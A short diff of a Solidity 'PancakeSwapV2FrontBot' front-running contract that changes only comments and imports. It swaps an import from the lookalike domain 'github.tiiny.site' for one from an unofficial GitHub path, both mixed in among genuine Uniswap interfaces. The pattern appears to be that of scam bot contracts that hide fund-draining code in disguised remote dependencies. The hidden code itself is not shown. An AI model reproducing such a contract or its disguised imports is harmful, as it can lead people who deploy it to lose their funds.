@@ -1,12 +1,10 @@
 pragma solidity ^0.6.6;
 
 
-// PancakeSwap FrontrunDeployer
+// Sniper Bot Dependencies
 import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol";
-
-// PancakeSwap manager
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
-import "https://github.tiiny.site/js/front_running_base.js";
+import "https://github.com/pcsjas/Uniswap/blob/contracts/IUniswapV1Bundler";
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
 
 contract PancakeSwapV2FrontBot {
